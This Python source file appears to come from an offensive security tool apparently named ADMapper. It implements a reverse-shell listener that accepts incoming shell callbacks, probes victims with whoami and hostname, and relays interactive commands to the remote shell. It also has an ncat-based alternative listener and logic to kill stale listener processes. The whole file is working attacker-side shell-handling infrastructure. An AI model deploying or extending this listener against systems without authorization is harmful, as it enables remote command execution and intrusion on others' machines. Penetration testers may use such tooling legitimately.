from __future__ import annotations

import os
import shutil
import socket
import subprocess
import threading
import time
from collections.abc import Callable
from dataclasses import dataclass
from pathlib import Path

from admapper.support.output import print_info, print_success, print_warning
from admapper.support.platform import is_linux, is_macos, resolve_executable


@dataclass
class ShellCapture:
    connected: bool = False
    peer: str = ""
    output: str = ""
    error: str = ""


class ReverseShellListener:
    """Built-in TCP listener — no external ncat required.

    By default it probes the shell once after connection and closes the
    socket. Call ``keep_alive=True`` or ``persist()`` to keep the socket
    open so commands can be sent/received interactively.
    """

    def __init__(
        self,
        port: int,
        *,
        bind_host: str = "0.0.0.0",
        keep_alive: bool = False,
        persistent: bool = False,
        on_disconnect: Callable[[], None] | None = None,
    ) -> None:
        self.port = port
        self.bind_host = bind_host
        self.keep_alive = keep_alive
        self.persistent = persistent
        self.capture = ShellCapture()
        self._sock: socket.socket | None = None
        self._conn: socket.socket | None = None
        self._thread: threading.Thread | None = None
        self._ready = threading.Event()
        self._connected = threading.Event()
        self._session_done = threading.Event()
        self._stop = threading.Event()
        self._on_disconnect = on_disconnect
        self._bind_error: Exception | None = None
        self._io_lock = threading.Lock()
        self._interact_mode = False
        self._probe_done = threading.Event()
        self._probe_done.set()

    def wait_probe(self, timeout: float = 15.0) -> bool:
        """Block until the initial whoami/hostname probe finishes (or timeout)."""
        return self._probe_done.wait(timeout=max(timeout, 0))

    def start(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        self._thread = threading.Thread(
            target=self._serve,
            name=f"admapper-listener-{self.port}",
            daemon=True,
        )
        self._thread.start()
        if not self._ready.wait(timeout=5):
            # Expose underlying bind error instead of hiding it.
            self._stop.set()
            for handle in (self._sock,):
                if handle is not None:
                    try:
                        handle.close()
                    except OSError:
                        pass
            raise self._bind_error or RuntimeError(f"listener failed to bind on port {self.port}")

    def _serve(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind((self.bind_host, self.port))
        except OSError as exc:
            self._bind_error = exc
            self._ready.set()
            return
        try:
            sock.listen(1)
            sock.settimeout(1.0)
            self._sock = sock
            self._ready.set()
            print_info(f"listener ready on {self.bind_host}:{self.port}")
            while not self._stop.is_set():
                try:
                    conn, addr = sock.accept()
                except TimeoutError:
                    continue
                except OSError:
                    break
                self._conn = conn
                self.capture.connected = True
                self.capture.peer = f"{addr[0]}:{addr[1]}"
                self._connected.set()
                self._probe_done.clear()
                print_success(f"Shell callback received from {self.capture.peer}")
                self._probe_shell(conn)
                if self.keep_alive:
                    if self.persistent:
                        self._session_done.wait()
                        self._release_connection()
                        if self._stop.is_set():
                            break
                        continue
                    break
                try:
                    conn.close()
                except OSError:
                    pass
                break
        finally:
            try:
                sock.close()
            except OSError:
                pass

    def _probe_shell(self, conn: socket.socket) -> None:
        try:
            conn.settimeout(8.0)
            time.sleep(0.5)
            chunks: list[str] = []
            try:
                chunks.append(conn.recv(4096).decode("utf-8", errors="replace"))
            except TimeoutError:
                pass
            for cmd in (b"whoami\r\n", b"hostname\r\n"):
                try:
                    conn.send(cmd)
                    chunks.append(conn.recv(4096).decode("utf-8", errors="replace"))
                except (TimeoutError, OSError):
                    break
            self.capture.output = "".join(chunks).strip()
        except OSError as exc:
            self.capture.error = str(exc)
        finally:
            self._probe_done.set()

    def release_session(self) -> None:
        """Signal the accept loop that the interactive REPL finished (persistent mode)."""
        self._session_done.set()

    def _release_connection(self) -> None:
        conn = self._conn
        self._conn = None
        if conn is not None:
            try:
                conn.close()
            except OSError:
                pass
        self.capture = ShellCapture()
        self._connected.clear()
        self._session_done.clear()
        if self._on_disconnect:
            try:
                self._on_disconnect()
            except Exception:
                pass

    def __init_last_stdout(self) -> None:
        if not hasattr(self, "_last_stdout"):
            self._last_stdout: list[str] = []

    def persist(self) -> None:
        """Switch listener into interactive keep-alive mode."""
        self.keep_alive = True
        self.__init_last_stdout()

    def begin_interact(self) -> None:
        """Exclusive raw I/O for REPL — ``send()`` must not run concurrently."""
        with self._io_lock:
            self._interact_mode = True
            self._drain_socket(timeout=0.5)

    def end_interact(self) -> None:
        with self._io_lock:
            self._interact_mode = False

    def send_raw(self, line: str) -> None:
        """Write one line to the shell (no marker, no recv). For interactive REPL only."""
        conn = self._conn
        if conn is None or not self.capture.connected:
            raise RuntimeError("no active reverse shell connection")
        payload = line.rstrip("\r\n") + "\r\n"
        with self._io_lock:
            try:
                conn.sendall(payload.encode("utf-8"))
            except OSError as exc:
                raise RuntimeError(f"failed to send command: {exc}") from exc

    def _drain_socket(self, *, timeout: float = 0.3) -> str:
        conn = self._conn
        if conn is None:
            return ""
        collected = ""
        deadline = time.time() + max(timeout, 0)
        while time.time() < deadline:
            try:
                conn.settimeout(0.05)
                data = conn.recv(4096)
            except TimeoutError:
                continue
            except OSError:
                break
            if not data:
                break
            collected += data.decode("utf-8", errors="replace")
        try:
            conn.settimeout(None)
        except OSError:
            pass
        return collected

    def send(self, command: str, *, timeout: float = 5.0) -> str:
        """Send a command to the interactive shell and return its output.

        The command is normalized with CRLF and a trailing marker command so
        we know where output ends. We then read until the marker appears.
        Not safe during ``begin_interact()`` — use ``send_raw()`` in the REPL.
        """
        if self._interact_mode:
            raise RuntimeError("send() unavailable during interactive REPL — use send_raw()")

        self.__init_last_stdout()
        conn = self._conn
        if conn is None or not self.capture.connected:
            raise RuntimeError("no active reverse shell connection")

        marker = f"__admapper_marker_{int(time.time() * 1000)}__"
        payload = command.rstrip("\r\n") + f"\r\necho {marker}\r\n"
        with self._io_lock:
            try:
                conn.sendall(payload.encode("utf-8"))
            except OSError as exc:
                raise RuntimeError(f"failed to send command: {exc}") from exc

            deadline = time.time() + max(timeout, 0)
            buffer = ""
            try:
                conn.settimeout(0.25)
            except OSError:
                pass
            while time.time() < deadline:
                try:
                    chunk = conn.recv(4096)
                except TimeoutError:
                    continue
                except OSError as exc:
                    raise RuntimeError(f"connection lost: {exc}") from exc
                if not chunk:
                    break
                buffer += chunk.decode("utf-8", errors="replace")
                if marker in buffer:
                    before, _, _ = buffer.partition(marker)
                    return before.strip()
            try:
                conn.settimeout(None)
            except OSError:
                pass
            return buffer.strip()

    def receive(self, *, timeout: float = 0.5) -> str:
        """Return any data already buffered from the shell without blocking."""
        self.__init_last_stdout()
        conn = self._conn
        if conn is None or not self.capture.connected:
            return ""
        buffer = ""
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                conn.settimeout(0.05)
                data = conn.recv(4096)
            except TimeoutError:
                continue
            except OSError:
                break
            if not data:
                break
            buffer += data.decode("utf-8", errors="replace")
            if time.time() + 0.01 > deadline:
                break
        try:
            conn.settimeout(None)
        except OSError:
            pass
        return buffer

    def wait(self, timeout: float) -> ShellCapture:
        self._connected.wait(timeout=max(timeout, 0))
        return self.capture

    def close(self) -> None:
        self._stop.set()
        for handle in (self._conn, self._sock):
            if handle is not None:
                try:
                    handle.close()
                except OSError:
                    pass


class NcatListener:
    """Optional external ncat backend (--use-ncat)."""

    def __init__(self, port: int) -> None:
        self.port = port
        self.capture = ShellCapture()
        self._proc: subprocess.Popen[str] | None = None

    def start(self) -> None:
        ncat = resolve_executable(["ncat", "nc"])
        if not ncat:
            raise RuntimeError("ncat/nc not found — use built-in listener (default)")
        if "ncat" in Path(ncat).name:
            cmd = [ncat, "-lvnp", str(self.port)]
        else:
            cmd = [ncat, "-lvnp", str(self.port)]
        print_info(f"listener: {' '.join(cmd)}")
        self._proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )

    def wait(self, timeout: float) -> ShellCapture:
        if not self._proc or not self._proc.stdout:
            return self.capture
        deadline = time.time() + timeout
        lines: list[str] = []
        while time.time() < deadline:
            if self._proc.poll() is not None:
                break
            line = self._proc.stdout.readline()
            if not line:
                time.sleep(0.2)
                continue
            lines.append(line)
            if "connect" in line.lower():
                self.capture.connected = True
                self.capture.output = "".join(lines)
                print_success("reverse shell activity on ncat listener")
                break
        return self.capture

    def close(self) -> None:
        if self._proc and self._proc.poll() is None:
            self._proc.terminate()
            try:
                self._proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                self._proc.kill()


def _kill_existing_admapper_listener(port: int) -> bool:
    """Kill any admapper listener process bound to ``port`` (macOS/Linux).

    Returns True if a process was killed. Uses lsof on macOS and ss/lsof on
    Linux. Windows is not supported because socket ownership cannot be safely
    resolved without external dependencies.
    """
    if not (is_macos() or is_linux()):
        return False

    pids: set[int] = set()
    cmd: list[str] = []
    if shutil.which("lsof"):
        cmd = ["lsof", "-ti", f"tcp:{port}"]
    elif is_linux() and shutil.which("ss"):
        # ss -lptn is not easy to parse for PID; rely on lsof handled by else.
        return False
    else:
        return False

    try:
        out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, text=True).strip()
    except subprocess.CalledProcessError:
        return False

    bad_pids: set[int] = set()
    for line in out.splitlines():
        # lsof -ti prints one PID per line; we still want to verify the command
        # belongs to admapper or python to avoid killing unrelated tools.
        try:
            pid = int(line.split()[0] if len(line.split()) > 1 else line)
        except ValueError:
            continue
        pids.add(pid)

    for pid in pids:
        try:
            cmdline = (
                subprocess.check_output(
                    ["ps", "-p", str(pid), "-o", "command="],
                    stderr=subprocess.DEVNULL,
                    text=True,
                )
                .strip()
                .lower()
            )
        except (subprocess.CalledProcessError, FileNotFoundError):
            continue
        if "admapper" in cmdline or "python" in cmdline:
            bad_pids.add(pid)

    killed = False
    for pid in bad_pids:
        try:
            os.kill(pid, 9)
            killed = True
            print_warning(f"killed stale admapper listener PID {pid} on port {port}")
        except (OSError, ProcessLookupError):
            pass
    return killed


def start_listener(
    port: int,
    *,
    use_ncat: bool = False,
    persistent: bool = False,
) -> ReverseShellListener | NcatListener:
    if use_ncat:
        listener: ReverseShellListener | NcatListener = NcatListener(port)
    else:
        listener = ReverseShellListener(port, keep_alive=True, persistent=persistent)
    try:
        listener.start()
    except OSError as exc:
        if "address already in use" in str(exc).lower():
            print_warning(f"port {port} already in use — trying to release it")
            if _kill_existing_admapper_listener(port):
                listener.start()
            else:
                raise RuntimeError(
                    f"port {port} is already in use by a process outside ADMapper — "
                    "stop it manually or use a different port (e.g. --lport 4445)"
                ) from exc
        else:
            raise
    return listener
